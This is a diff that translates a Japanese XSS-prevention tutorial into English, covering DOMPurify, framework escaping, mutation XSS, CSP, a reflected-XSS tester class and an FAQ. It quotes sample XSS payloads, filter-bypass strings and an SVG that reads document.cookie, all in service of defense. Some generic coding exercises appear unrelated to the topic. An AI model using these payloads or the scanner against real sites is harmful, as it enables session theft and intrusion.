 const dirty = '<img src=x onerror=alert(1)//>';
 const clean = DOMPurify.sanitize(dirty);
-// => '<img src="x">' (onerror属性が除去される)
+// => '<img src="x">' (onerror attribute is removed)
 
-// === カスタム設定 ===
+// === Custom configuration ===
 const config = {
-    // 許可するタグ
+    // Allowed tags
     ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br',
                    'ul', 'ol', 'li', 'h1', 'h2', 'h3',
                    'blockquote', 'code', 'pre'],
 
-    // 許可する属性
+    // Allowed attributes
     ALLOWED_ATTR: ['href', 'title', 'class'],
 
-    // javascript: URL を禁止
+    // Prohibit javascript: URLs
     ALLOW_DATA_ATTR: false,
 
-    // <a> タグに target="_blank" と rel="noopener" を自動追加
+    // Automatically add target="_blank" and rel="noopener" to <a> tags
     ADD_ATTR: ['target'],
 
-    // 全てのリンクに rel="noopener noreferrer" を追加
+    // Add rel="noopener noreferrer" to all links
     WHOLE_DOCUMENT: false,
 
-    // SVGタグを許可するか
+    // Whether to allow SVG tags
     USE_PROFILES: {svg: false, svgFilters: false, mathMl: false},
 };
 
 const cleanHtml = DOMPurify.sanitize(userHtml, config);
 
-// === フック機能 ===
-// サニタイズ中にカスタム処理を追加
+// === Hook functionality ===
+// Add custom processing during sanitization
 DOMPurify.addHook('afterSanitizeAttributes', function(node) {
-    // 全ての <a> タグに target="_blank" と rel="noopener" を追加
+    // Add target="_blank" and rel="noopener" to all <a> tags
     if (node.tagName === 'A') {
         node.setAttribute('target', '_blank');
         node.setAttribute('rel', 'noopener noreferrer');
     }
-    // 画像のsrcをプロキシ経由に変更
+    // Change image src to go through a proxy
     if (node.tagName === 'IMG' && node.getAttribute('src')) {
         const originalSrc = node.getAttribute('src');
         node.setAttribute('src', `/proxy/image?url=${encodeURIComponent(originalSrc)}`);
     }
 });
 
-// === Trusted Types との統合 ===
-// ブラウザの Trusted Types API と連携
+// === Integration with Trusted Types ===
+// Integration with the browser's Trusted Types API
 if (window.trustedTypes && window.trustedTypes.createPolicy) {
     const policy = trustedTypes.createPolicy('default', {
         createHTML: (input) => DOMPurify.sanitize(input, config),
@@ -722,39 +722,39 @@ if (window.trustedTypes && window.trustedTypes.createPolicy) {
 
 ---
 
-## 6. フレームワーク別の組み込み対策
+## 6. Built-in Countermeasures by Framework
 
-### 6.1 フレームワーク比較
+### 6.1 Framework Comparison
 
-| フレームワーク | 自動エスケープ | CSP対応 | 注意点 |
-|---------------|:----------:|:------:|------|
-| React | `{}` で自動エスケープ | Helmet | `dangerouslySetInnerHTML` に注意 |
-| Angular | デフォルトでサニタイズ | 組み込み | `bypassSecurityTrust*` に注意 |
-| Vue.js | `{{ }}` で自動エスケープ | 手動 | `v-html` に注意 |
-| Django | テンプレートで自動エスケープ | middleware | `|safe` フィルタに注意 |
-| Flask/Jinja2 | 自動エスケープ（有効時） | 手動 | `|safe` フィルタ、`Markup()` に注意 |
-| Next.js | Reactの自動エスケープ | 設定ファイル | SSR時のXSSに注意 |
+| Framework | Auto Escaping | CSP Support | Notes |
+|-----------|:------------:|:-----------:|-------|
+| React | Auto-escape with `{}` | Helmet | Beware of `dangerouslySetInnerHTML` |
+| Angular | Sanitized by default | Built-in | Beware of `bypassSecurityTrust*` |
+| Vue.js | Auto-escape with `{{ }}` | Manual | Beware of `v-html` |
+| Django | Auto-escape in templates | middleware | Beware of `|safe` filter |
+| Flask/Jinja2 | Auto-escape (when enabled) | Manual | Beware of `|safe` filter and `Markup()` |
+| Next.js | React's auto-escape | Config file | Beware of XSS during SSR |
 
-### 6.2 React での安全なレンダリング
+### 6.2 Safe Rendering in React
 
 ```javascript
-// コード例9: React での安全なレンダリング
+// Code Example 9: Safe rendering in React
 import DOMPurify from "dompurify";
 
-// 安全: JSXは自動でエスケープ
+// Safe: JSX auto-escapes
 function SafeComponent({ userInput }) {
-  return <div>{userInput}</div>; // HTMLとして解釈されない
+  return <div>{userInput}</div>; // Not interpreted as HTML
 }
 
-// 安全: 属性値も自動エスケープ
+// Safe: Attribute values are also auto-escaped
 function SafeAttribute({ userInput }) {
   return <div title={userInput}>Content</div>;
-  // " が &#34; にエスケープされる
+  // " is escaped to &#34;
 }
 
-// 危険: dangerouslySetInnerHTMLは避ける
+// Dangerous: avoid dangerouslySetInnerHTML
 function DangerousComponent({ htmlContent }) {
-  // どうしても必要な場合はDOMPurifyでサニタイズ
+  // If absolutely necessary, sanitize with DOMPurify
   const clean = DOMPurify.sanitize(htmlContent, {
     ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
     ALLOWED_ATTR: ["href", "title"],
@@ -762,12 +762,12 @@ function DangerousComponent({ htmlContent }) {
   return <div dangerouslySetInnerHTML={{ __html: clean }} />;
 }
 
-// 危険: href属性にユーザー入力
+// Dangerous: user input in href attribute
 function DangerousLink({ userUrl }) {
-  // NG: javascript: URL でXSSが発生する
+  // NG: XSS can occur with javascript: URLs
   // return <a href={userUrl}>Click</a>;
 
-  // OK: プロトコルを検証
+  // OK: Validate the protocol
   const safeUrl = sanitizeUrl(userUrl);
   return <a href={safeUrl}>Click</a>;
 }
@@ -778,18 +778,18 @@ function sanitizeUrl(url) {
     if (['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
       return url;
     }
-    return '#'; // 安全でないプロトコルはブロック
+    return '#'; // Block unsafe protocols
   } catch {
-    return '#'; // 無効なURLはブロック
+    return '#'; // Block invalid URLs
   }
 }
 
-// 安全: SSRでのデータ受け渡し
+// Safe: Passing data in SSR
 function ServerSideData({ serverData }) {
   // NG: <script>window.__DATA__ = {serverData}</script>
-  // → XSSの危険性あり
+  // → Risk of XSS
 
-  // OK: JSON.stringifyでエスケープしてdata属性に格納
+  // OK: Escape with JSON.stringify and store in data attribute
   return (
     <div id="app-data"
          data-config={JSON.stringify(serverData)}>
@@ -798,24 +798,24 @@ function ServerSideData({ serverData }) {
 }
 ```
 
-### 6.3 Vue.js での安全なレンダリング
+### 6.3 Safe Rendering in Vue.js
 
 ```javascript
-// コード例10: Vue.js での安全なレンダリング
+// Code Example 10: Safe rendering in Vue.js
 
-// 安全: マスタッシュ構文は自動エスケープ
+// Safe: Mustache syntax auto-escapes
 // <template>
 //   <p>{{ userInput }}</p>
 //   <!-- <script>alert(1)</script> → &lt;script&gt;alert(1)&lt;/script&gt; -->
 // </template>
 
-// 危険: v-html はHTMLとして解釈される
+// Dangerous: v-html is interpreted as HTML
 // <template>
 //   <div v-html="userHtml"></div>
-//   <!-- XSSの危険あり -->
+//   <!-- Risk of XSS -->
 // </template>
 
-// 安全: v-html + DOMPurify
+// Safe: v-html + DOMPurify
 import DOMPurify from 'dompurify';
 
 export default {
@@ -832,7 +832,7 @@ export default {
 //   <div v-html="safeHtml"></div>
 // </template>
 
-// Vue.js 用グローバルディレクティブ（v-safe-html）
+// Global directive for Vue.js (v-safe-html)
 // app.directive('safe-html', {
 //   mounted(el, binding) {
 //     el.innerHTML = DOMPurify.sanitize(binding.value);
@@ -845,53 +845,53 @@ export default {
 
 ---
 
-## 7. Mutation XSS（mXSS）
+## 7. Mutation XSS (mXSS)
 
 ```
-Mutation XSS (mXSS) とは:
+What is Mutation XSS (mXSS):
 
-  ブラウザのHTMLパーサーが入力を「修正」する過程で
-  無害に見える入力が有害に変換される攻撃
+  An attack where seemingly harmless input is converted into harmful
+  content during the browser's HTML parser "correction" process
 
-  例:
-  入力: <p><svg><style><img src=x onerror=alert(1)>
+  Example:
+  Input: <p><svg><style><img src=x onerror=alert(1)>
 
-  サニタイザが処理:
-    → <p>, <svg>, <style> は許可タグ
-    → <img> は <style> の中なので実行されないと判断
-    → 通過させる
+  Sanitizer processes:
+    → <p>, <svg>, <style> are allowed tags
+    → <img> is inside <style>, so deemed non-executable
+    → Passes through
 
-  ブラウザが処理:
-    → SVG の <style> 内のHTMLを再パースする
-    → <img src=x onerror=alert(1)> が有効なHTMLとして解釈される
-    → XSSが発生!
+  Browser processes:
+    → Re-parses the HTML inside SVG's <style>
+    → <img src=x onerror=alert(1)> is interpreted as valid HTML
+    → XSS occurs!
 
-  対策:
-  - DOMPurify を使用（mXSS への対策が組み込まれている）
-  - 独自のサニタイザは mXSS に対して脆弱な場合が多い
-  - Trusted Types API を導入
+  Countermeasures:
+  - Use DOMPurify (has built-in protection against mXSS)
+  - Custom sanitizers are often vulnerable to mXSS
+  - Adopt the Trusted Types API
 ```
 
 ```
 Trusted Types API:
 
-  ブラウザネイティブのXSS対策:
-  - innerHTML 等の危険なシンクへの代入を制御
-  - 信頼されたポリシーを通じてのみHTML文字列を生成可能
+  Browser-native XSS protection:
+  - Controls assignments to dangerous sinks like innerHTML
+  - HTML strings can only be generated through trusted policies
 
-  CSPで有効化:
+  Enable via CSP:
   Content-Security-Policy: require-trusted-types-for 'script';
                            trusted-types dompurify default;
 
   JavaScript:
-  // ポリシーを定義
+  // Define a policy
   const policy = trustedTypes.createPolicy('dompurify', {
     createHTML: (input) => DOMPurify.sanitize(input),
   });
 
-  // 使用（Trusted Types なしで innerHTML に代入するとエラー）
+  // Usage (assigning to innerHTML without Trusted Types causes an error)
   element.innerHTML = policy.createHTML(userInput);
-  // OK: DOMPurifyを通した安全なHTML
+  // OK: Safe HTML passed through DOMPurify
 
   element.innerHTML = userInput;
   // TypeError: This document requires 'TrustedHTML' assignment
@@ -899,84 +899,84 @@ Trusted Types API:
 
 ---
 
-## 8. エッジケース
+## 8. Edge Cases
 
-### エッジケース1: 文字エンコーディングによるバイパス
-
-```
-UTF-7 XSS（古いブラウザ/設定）:
-
-  Content-Type に charset が未指定の場合、
-  古いIEはUTF-7として解釈する可能性があった
-
-  入力: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
-  UTF-7デコード: <script>alert(1)</script>
-
-  対策:
-  - Content-Type ヘッダーに charset=utf-8 を常に指定
-  - X-Content-Type-Options: nosniff を設定
-  - <meta charset="UTF-8"> を HTML の先頭に配置
-```
-
-### エッジケース2: JSONレスポンスでのXSS
+### Edge Case 1: Bypassing via Character Encoding
 
 ```
-JSON レスポンスの XSS:
+UTF-7 XSS (old browsers/configurations):
 
-  レスポンス:
+  When charset is not specified in Content-Type,
+  old IE could interpret content as UTF-7
+
+  Input: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+  UTF-7 decoded: <script>alert(1)</script>
+
+  Countermeasures:
+  - Always specify charset=utf-8 in Content-Type header
+  - Set X-Content-Type-Options: nosniff
+  - Place <meta charset="UTF-8"> at the beginning of HTML
+```
+
+### Edge Case 2: XSS in JSON Responses
+
+```
+XSS in JSON responses:
+
+  Response:
   Content-Type: application/json
   {"name": "<script>alert(1)</script>"}
 
-  通常は安全（JSONはHTMLとして解釈されない）
+  Normally safe (JSON is not interpreted as HTML)
 
-  しかし以下の場合に危険:
-  1. Content-Type が text/html に誤設定されている
-  2. IE の Content-Type sniffing が有効
-  3. JSONP で返している場合
+  However, dangerous in the following cases:
+  1. Content-Type is incorrectly set to text/html
+  2. IE's Content-Type sniffing is enabled
+  3. When returning as JSONP
 
-  対策:
-  - Content-Type: application/json を正しく設定
-  - X-Content-Type-Options: nosniff を設定
-  - JSONレスポンスの先頭に ")]}',\n" を付与（Angular方式）
-  - JSON内の </ を \u003c\u002f にエスケープ
+  Countermeasures:
+  - Correctly set Content-Type: application/json
+  - Set X-Content-Type-Options: nosniff
+  - Prepend ")]}',\n" to JSON responses (Angular method)
+  - Escape </ in JSON to \u003c\u002f
 ```
 
-### エッジケース3: SVGファイルのXSS
+### Edge Case 3: XSS in SVG Files
 
 ```
-SVG ファイルの XSS:
+XSS in SVG files:
 
-  SVG は XML ベースであり、<script> タグを含むことができる
+  SVG is XML-based and can contain <script> tags
 
   <svg xmlns="http://www.w3.org/2000/svg">
     <script>alert(document.cookie)</script>
   </svg>
 
-  攻撃シナリオ:
-  1. ユーザーが SVG ファイルをアップロード
-  2. サーバーが SVG をそのまま配信
-  3. 他のユーザーが SVG を閲覧 → XSS
+  Attack scenario:
+  1. User uploads an SVG file
+  2. Server serves the SVG as-is
+  3. Another user views the SVG → XSS
 
-  対策:
-  - アップロードされた SVG の <script> タグを除去
-  - SVG を別ドメイン（CDN等）から配信
-  - Content-Disposition: attachment で表示を防止
-  - SVG 内のイベントハンドラ（onclick等）を除去
-  - <img src="uploaded.svg"> として読み込む
-    （<img> 経由ではスクリプトは実行されない）
+  Countermeasures:
+  - Remove <script> tags from uploaded SVGs
+  - Serve SVGs from a separate domain (CDN etc.)
+  - Prevent display with Content-Disposition: attachment
+  - Remove event handlers (onclick etc.) from within SVG
+  - Load via <img src="uploaded.svg">
+    (scripts do not execute when loaded through <img>)
 ```
 
 ---
 
-## 9. テスト手法
+## 9. Testing Methods
 
 ```python
-# コード例11: XSS脆弱性のテスト
+# Code Example 11: Testing for XSS vulnerabilities
 import requests
 from typing import List, Dict
 
 class XSSTester:
-    """XSS脆弱性の基本テスト"""
+    """Basic XSS vulnerability testing"""
 
     BASIC_PAYLOADS = [
         '<script>alert(1)</script>',
@@ -1000,7 +1000,7 @@ class XSSTester:
     ]
 
     def test_reflected(self, url: str, param: str) -> List[Dict]:
-        """Reflected XSS テスト"""
+        """Reflected XSS test"""
         results = []
         for payload in self.BASIC_PAYLOADS:
             response = requests.get(url, params={param: payload})
@@ -1021,7 +1021,7 @@ class XSSTester:
         return results
 
     def test_csp_headers(self, url: str) -> Dict:
-        """CSPヘッダーの確認"""
+        """Check CSP headers"""
         response = requests.get(url)
         csp = response.headers.get("Content-Security-Policy", "")
         csp_report = response.headers.get(
@@ -1044,113 +1044,112 @@ class XSSTester:
             "score": max(0, 100 - len(issues) * 25),
         }
 
-# 使用例（必ず許可された環境でのみ）
+# Usage example (only run in a permitted environment)
 # tester = XSSTester()
 # results = tester.test_reflected("http://localhost:8080/search", "q")
 ```
 
 ---
 
-## 10. パフォーマンスに関する考察
+## 10. Performance Considerations
 
 ```
-XSS対策のパフォーマンス影響:
+Performance impact of XSS countermeasures:
 
   +-----------------------------+------------------+------------------+
-  | 対策                        | サーバー側影響    | クライアント側影響 |
+  | Countermeasure              | Server-side      | Client-side      |
   +-----------------------------+------------------+------------------+
-  | HTMLエスケープ               | ~0.01ms/処理     | なし              |
-  | テンプレートエンジン         | ~0.1ms/レンダリング| なし             |
-  | (自動エスケープ)            |                  |                  |
+  | HTML escaping               | ~0.01ms/process  | None             |
+  | Template engine             | ~0.1ms/render    | None             |
+  | (auto-escaping)             |                  |                  |
   +-----------------------------+------------------+------------------+
-  | DOMPurify サニタイズ         | N/A              | ~1-5ms/処理      |
-  | (クライアント側)            |                  | (HTMLサイズ依存)  |
+  | DOMPurify sanitization      | N/A              | ~1-5ms/process   |
+  | (client-side)               |                  | (depends on HTML)|
   +-----------------------------+------------------+------------------+
-  | CSP ヘッダー                | ~0.01ms          | パース: ~0.1ms   |
-  |                             | (ヘッダー追加)    | 検証: ~0.01ms/   |
-  |                             |                  |  リソース読み込み |
+  | CSP header                  | ~0.01ms          | Parse: ~0.1ms    |
+  |                             | (header addition)| Verify: ~0.01ms/ |
+  |                             |                  |  resource load   |
   +-----------------------------+------------------+------------------+
-  | CSP nonce 生成              | ~0.05ms          | なし              |
+  | CSP nonce generation        | ~0.05ms          | None             |
   +-----------------------------+------------------+------------------+
 
-  結論:
-  - XSS対策のパフォーマンス影響はほぼ無視できるレベル
-  - DOMPurify は巨大なHTMLに対しては数msかかるが許容範囲
-  - CSP はブラウザのリソース読み込みを制限するため
-    かえってパフォーマンスが向上する場合もある
-    （不要な外部リソースの読み込みをブロック）
+  Conclusion:
+  - Performance impact of XSS countermeasures is nearly negligible
+  - DOMPurify may take a few ms on very large HTML, but within acceptable range
+  - CSP can actually improve performance by restricting
+    resource loading (blocking unnecessary external resources)
 ```
 
 ---
 
-## 演習
+## Exercises
 
-### 演習1: 基礎 — コンテキスト別エスケープ
+### Exercise 1: Basic — Context-Specific Escaping
 
-**課題**: 以下の各コンテキストで安全に出力するエスケープ関数を実装せよ。
-
-```
-要件:
-1. HTMLボディコンテキストでのエスケープ
-2. HTML属性コンテキストでのエスケープ（クォート付き）
-3. JavaScriptコンテキストでのエスケープ
-4. URLコンテキストでのエスケープ
-
-テスト:
-- 各関数に <script>alert(1)</script> を入力してXSSが発生しないこと
-- " ' < > & の各文字が正しくエスケープされること
-```
-
-### 演習2: 応用 — CSPの段階的導入
-
-**課題**: 既存のWebアプリケーションにCSPを段階的に導入せよ。
+**Task**: Implement escaping functions to safely output in each of the following contexts.
 
 ```
-要件:
-1. Report-Only モードでCSPを設定
-2. CSP違反レポートを収集・分析するエンドポイントを実装
-3. インラインスクリプトをnonceベースに書き換え
-4. 外部リソースのホワイトリストを作成
-5. 強制モードに切り替え
+Requirements:
+1. Escaping for HTML body context
+2. Escaping for HTML attribute context (with quotes)
+3. Escaping for JavaScript context
+4. Escaping for URL context
 
-検証:
-- Google CSP Evaluator でポリシーを評価
-- ブラウザの DevTools Console で CSP 違反を確認
+Tests:
+- Input <script>alert(1)</script> into each function and verify no XSS occurs
+- Verify that each of " ' < > & is correctly escaped
 ```
 
-### 演習3: 発展 — XSS脆弱性スキャナー
+### Exercise 2: Applied — Gradual CSP Introduction
 
-**課題**: 簡易的なXSS脆弱性スキャナーを実装せよ。
+**Task**: Gradually introduce CSP into an existing web application.
 
 ```
-要件:
-1. URLとパラメータ名を指定して Reflected XSS をテスト
-2. 複数のペイロード（<script>, <img onerror>, <svg onload> 等）を試行
-3. レスポンス内にペイロードがエスケープされずに反映されているか検出
-4. CSPヘッダーの有無と設定内容を分析
-5. テスト結果のレポートを生成
+Requirements:
+1. Configure CSP in Report-Only mode
+2. Implement an endpoint to collect and analyze CSP violation reports
+3. Rewrite inline scripts to nonce-based
+4. Create an allowlist of external resources
+5. Switch to enforced mode
 
-注意: 必ず自分が管理するサーバーに対してのみ実行すること
+Verification:
+- Evaluate the policy using Google CSP Evaluator
+- Check CSP violations in the browser DevTools Console
+```
+
+### Exercise 3: Advanced — XSS Vulnerability Scanner
+
+**Task**: Implement a simple XSS vulnerability scanner.
+
+```
+Requirements:
+1. Test for Reflected XSS by specifying URL and parameter name
+2. Try multiple payloads (<script>, <img onerror>, <svg onload>, etc.)
+3. Detect whether the payload is reflected unescaped in the response
+4. Analyze the presence and configuration of CSP headers
+5. Generate a report of test results
+
+Note: Only run against servers you manage
 ```
 
 ---
 
-## アンチパターン
+## Anti-patterns
 
-### アンチパターン1: ブラックリスト方式のフィルタリング
+### Anti-pattern 1: Blacklist-based Filtering
 
-`<script>` タグだけをフィルタするアプローチ。XSSのバイパス手法は無数に存在するため、ブラックリストでは防ぎきれない。ホワイトリスト方式（許可するタグ・属性を限定）を採用すべきである。
+An approach that only filters `<script>` tags. Since there are countless XSS bypass techniques, a blacklist cannot provide sufficient protection. A whitelist approach (limiting allowed tags and attributes) should be used instead.
 
 ```python
-# NG: ブラックリスト方式
+# NG: Blacklist approach
 def sanitize_bad(input_html):
     return input_html.replace("<script>", "").replace("</script>", "")
-# バイパス: <scr<script>ipt>alert(1)</scr</script>ipt>
-# バイパス: <ScRiPt>alert(1)</ScRiPt>
-# バイパス: <img src=x onerror=alert(1)>
-# バイパス: <svg onload=alert(1)>
+# Bypass: <scr<script>ipt>alert(1)</scr</script>ipt>
+# Bypass: <ScRiPt>alert(1)</ScRiPt>
+# Bypass: <img src=x onerror=alert(1)>
+# Bypass: <svg onload=alert(1)>
 
-# OK: ホワイトリスト方式（DOMPurifyまたはbleach）
+# OK: Whitelist approach (DOMPurify or bleach)
 import bleach
 def sanitize_good(input_html):
     return bleach.clean(input_html,
@@ -1158,26 +1157,26 @@ def sanitize_good(input_html):
                        attributes={"a": ["href"]})
 ```
 
-### アンチパターン2: クライアントサイドのみの対策
+### Anti-pattern 2: Client-side Only Countermeasures
 
-JavaScriptでの入力検証だけに頼るパターン。攻撃者はブラウザを経由せずAPIに直接リクエストを送信できるため、サーバーサイドでの検証が必須である。
+A pattern that relies solely on input validation in JavaScript. Attackers can send requests directly to the API without going through the browser, so server-side validation is mandatory.
 
-### アンチパターン3: innerHTML の乱用
+### Anti-pattern 3: Overuse of innerHTML
 
 ```javascript
-// NG: ユーザー入力を innerHTML に代入
+// NG: Assigning user input to innerHTML
 document.getElementById("output").innerHTML = userInput;
 
-// NG: jQuery の .html() もinnerHTMLと同様
+// NG: jQuery's .html() is the same as innerHTML
 $('#output').html(userInput);
 
-// OK: textContent を使用
+// OK: Use textContent
 document.getElementById("output").textContent = userInput;
 
-// OK: jQuery の .text() を使用
+// OK: Use jQuery's .text()
 $('#output').text(userInput);
 
-// OK: どうしても HTML を挿入する場合は DOMPurify 経由
+// OK: If HTML must be inserted, go through DOMPurify
 document.getElementById("output").innerHTML =
     DOMPurify.sanitize(userInput);
 ```
@@ -1185,45 +1184,45 @@ document.getElementById("output").innerHTML =
 
 ---
 
-## 実践演習
+## Practical Exercises
 
-### 演習1: 基本的な実装
+### Exercise 1: Basic Implementation
 
-以下の要件を満たすコードを実装してください。
+Implement code that meets the following requirements.
 
-**要件:**
-- 入力データの検証を行うこと
-- エラーハンドリングを適切に実装すること
-- テストコードも作成すること
+**Requirements:**
+- Validate input data
+- Implement proper error handling
+- Also create test code
 
 ```python
-# 演習1: 基本実装のテンプレート
+# Exercise 1: Basic implementation template
 class Exercise1:
-    """基本的な実装パターンの演習"""
+    """Exercise on basic implementation patterns"""
 
     def __init__(self):
         self.data = []
 
     def validate_input(self, value):
-        """入力値の検証"""
+        """Input value validation"""
         if value is None:
-            raise ValueError("入力値がNoneです")
+            raise ValueError("Input value is None")
         return True
 
     def process(self, value):
-        """データ処理のメインロジック"""
+        """Main data processing logic"""
         self.validate_input(value)
         self.data.append(value)
         return self.data
 
     def get_results(self):
-        """処理結果の取得"""
+        """Retrieve processing results"""
         return {
             'count': len(self.data),
             'data': self.data
         }
 
-# テスト
+# Tests
 def test_exercise1():
     ex = Exercise1()
     assert ex.process(1) == [1]
@@ -1232,26 +1231,26 @@ def test_exercise1():
 
     try:
         ex.process(None)
-        assert False, "例外が発生するべき"
+        assert False, "Exception should have been raised"
     except ValueError:
         pass
 
-    print("全テスト合格!")
+    print("All tests passed!")
 
 test_exercise1()
 ```
 
-### 演習2: 応用パターン
+### Exercise 2: Applied Pattern
 
-基本実装を拡張して、以下の機能を追加してください。
+Extend the basic implementation to add the following features.
 
 ```python
-# 演習2: 応用パターン
+# Exercise 2: Applied pattern
 from typing import List, Dict, Optional
 from datetime import datetime
 
 class AdvancedExercise:
-    """応用パターンの演習"""
+    """Exercise on applied patterns"""
 
     def __init__(self, max_size: int = 100):
         self._items: List[Dict] = []
@@ -1259,7 +1258,7 @@ class AdvancedExercise:
         self._created_at = datetime.now()
 
     def add(self, key: str, value: any) -> bool:
-        """アイテムの追加（サイズ制限付き）"""
+        """Add an item (with size limit)"""
         if len(self._items) >= self._max_size:
             return False
         self._items.append({
@@ -1270,14 +1269,14 @@ class AdvancedExercise:
         return True
 
     def find(self, key: str) -> Optional[Dict]:
-        """キーによる検索"""
+        """Search by key"""
         for item in reversed(self._items):
             if item['key'] == key:
                 return item
         return None
 
     def remove(self, key: str) -> bool:
-        """キーによる削除"""
+        """Delete by key"""
         for i, item in enumerate(self._items):
             if item['key'] == key:
                 self._items.pop(i)
@@ -1285,7 +1284,7 @@ class AdvancedExercise:
         return False
 
     def stats(self) -> Dict:
-        """統計情報"""
+        """Statistics"""
         return {
             'total_items': len(self._items),
             'max_size': self._max_size,
@@ -1293,44 +1292,44 @@ class AdvancedExercise:
             'uptime': str(datetime.now() - self._created_at)
         }
 
-# テスト
+# Tests
 def test_advanced():
     ex = AdvancedExercise(max_size=3)
     assert ex.add("a", 1) == True
     assert ex.add("b", 2) == True
     assert ex.add("c", 3) == True
-    assert ex.add("d", 4) == False  # サイズ制限
+    assert ex.add("d", 4) == False  # Size limit
     assert ex.find("b")['value'] == 2
     assert ex.remove("b") == True
     assert ex.find("b") is None
     stats = ex.stats()
     assert stats['total_items'] == 2
-    print("応用テスト全合格!")
+    print("All applied tests passed!")
 
 test_advanced()
 ```
 
-### 演習3: パフォーマンス最適化
+### Exercise 3: Performance Optimization
 
-以下のコードのパフォーマンスを改善してください。
+Improve the performance of the following code.
 
 ```python
-# 演習3: パフォーマンス最適化
+# Exercise 3: Performance optimization
 import time
 from functools import lru_cache
 
-# 最適化前（O(n^2)）
+# Before optimization (O(n^2))
 def slow_search(data: list, target: int) -> int:
-    """非効率な検索"""
+    """Inefficient search"""
     for i in range(len(data)):
         for j in range(i + 1, len(data)):
             if data[i] + data[j] == target:
                 return (i, j)
     return (-1, -1)
 
-# 最適化後（O(n)）
+# After optimization (O(n))
 def fast_search(data: list, target: int) -> tuple:
-    """ハッシュマップを使った効率的な検索"""
+    """Efficient search using a hash map"""
     seen = {}
     for i, num in enumerate(data):
         complement = target - num
@@ -1339,7 +1338,7 @@ def fast_search(data: list, target: int) -> tuple:
         seen[num] = i
     return (-1, -1)
 
-# ベンチマーク
+# Benchmark
 def benchmark():
     import random
     data = list(range(5000))
@@ -1354,122 +1353,122 @@ def benchmark():
     result2 = fast_search(data, target)
     fast_time = time.time() - start
 
-    print(f"非効率版: {slow_time:.4f}秒")
-    print(f"効率版:   {fast_time:.6f}秒")
-    print(f"高速化率: {slow_time/fast_time:.0f}倍")
+    print(f"Inefficient version: {slow_time:.4f}s")
+    print(f"Efficient version:   {fast_time:.6f}s")
+    print(f"Speedup: {slow_time/fast_time:.0f}x")
 
 benchmark()
 ```
 
-**ポイント:**
-- アルゴリズムの計算量を意識する
-- 適切なデータ構造を選択する
-- ベンチマークで効果を測定する
+**Key Points:**
+- Be mindful of algorithm complexity
+- Choose appropriate data structures
+- Measure effectiveness with benchmarks
 ---
 
 ## FAQ
 
-### Q1: 自動エスケープがあるフレームワークでもXSSは発生しますか?
+### Q1: Can XSS still occur in frameworks with auto-escaping?
 
-発生する。`dangerouslySetInnerHTML`（React）、`v-html`（Vue）、`|safe`（Django/Jinja2）など、自動エスケープをバイパスする機能を使う場合にXSSが発生する。これらの使用は最小限にし、使用する場合はDOMPurify等でサニタイズする。
+Yes. XSS can occur when using features that bypass auto-escaping, such as `dangerouslySetInnerHTML` (React), `v-html` (Vue), and `|safe` (Django/Jinja2). Use these sparingly, and when you must, sanitize with DOMPurify or similar.
 
-### Q2: CSPだけでXSSを完全に防げますか?
+### Q2: Can CSP alone completely prevent XSS?
 
-CSPだけでは不十分。CSPはXSSの影響を軽減する強力なツールだが、以下の場合はバイパスされる可能性がある:
-- `'unsafe-inline'` が設定されている場合
-- CSPバイパスガジェット（許可されたドメインにJSONPエンドポイントがある場合等）
-- DOM-based XSSの一部（データの流れがクライアント側で完結する場合）
-入力検証、出力エスケープ、CSPの多層防御が必要である。
+CSP alone is insufficient. CSP is a powerful tool for mitigating the impact of XSS, but it can be bypassed in the following cases:
+- When `'unsafe-inline'` is set
+- CSP bypass gadgets (e.g., when an allowed domain has a JSONP endpoint)
+- Some DOM-based XSS (when the data flow is entirely client-side)
+Layered defense combining input validation, output escaping, and CSP is required.
 
-### Q3: HttpOnly CookieはXSSに対して万全ですか?
+### Q3: Are HttpOnly Cookies a complete defense against XSS?
 
-HttpOnlyはJavaScriptからのCookieアクセスを防ぐが、XSS自体を防ぐものではない。XSSが成功すれば以下の攻撃が可能:
-- APIリクエストの送信（Cookie は自動的に含まれる）
-- ページ内容の改ざん
-- キーストロークの傍受
-- フィッシングフォームの表示
-Cookie窃取以外の攻撃手段は依然として有効である。
+HttpOnly prevents JavaScript access to Cookies, but does not prevent XSS itself. If XSS succeeds, the following attacks are still possible:
+- Sending API requests (Cookies are included automatically)
+- Defacing page content
+- Intercepting keystrokes
+- Displaying phishing forms
+Attack methods other than Cookie theft remain viable.
 
-### Q4: SVGファイルのアップロードを許可しても安全ですか?
+### Q4: Is it safe to allow SVG file uploads?
 
-SVGはXMLベースであり、`<script>` タグやイベントハンドラを含むことができるため、XSSのリスクがある。SVGを許可する場合は:
-- SVGのサニタイゼーション（DOMPurifyのSVGモード）
-- 別ドメイン（CDN）から配信
-- Content-Type を `image/svg+xml` に設定
-- `<img>` タグ経由でのみ表示（scriptは実行されない）
+SVG is XML-based and can contain `<script>` tags and event handlers, posing an XSS risk. If allowing SVGs:
+- Sanitize SVG (DOMPurify's SVG mode)
+- Serve from a separate domain (CDN)
+- Set Content-Type to `image/svg+xml`
+- Display only via `<img>` tags (scripts do not execute)
 
-### Q5: Markdown のレンダリングでXSSは発生しますか?
+### Q5: Can XSS occur when rendering Markdown?
 
-MarkdownをHTMLに変換する過程でXSSが発生する場合がある。特に、生のHTMLを許可するMarkdownパーサー（例: marked.js のデフォルト設定）は危険。対策:
-- `sanitize: true` オプションを有効にする
-- 変換後のHTMLをDOMPurifyでサニタイズする
-- marked.js + DOMPurify の組み合わせが推奨
+XSS can occur during the conversion of Markdown to HTML. In particular, Markdown parsers that allow raw HTML (e.g., marked.js with default settings) are dangerous. Countermeasures:
+- Enable the `sanitize: true` option
+- Sanitize the converted HTML with DOMPurify
+- The combination of marked.js + DOMPurify is recommended
 
-### Q6: Content-Security-Policy と Content-Security-Policy-Report-Only の違いは?
+### Q6: What is the difference between Content-Security-Policy and Content-Security-Policy-Report-Only?
 
-`Content-Security-Policy` はポリシーに違反するリソースの読み込みをブロックする。`Content-Security-Policy-Report-Only` はブロックせずに違反のみレポートする。CSP導入時はまず Report-Only で影響を確認し、問題がないことを確認してから強制モードに切り替えるのが推奨パターン。
-
----
-
-## トラブルシューティング
-
-### CSPを設定したらサイトが動かなくなった
-
-```
-チェックリスト:
-1. ブラウザの DevTools Console でCSP違反エラーを確認
-2. Report-Only モードに戻して違反レポートを収集
-3. インラインスクリプトがある場合:
-   → nonce または hash を設定
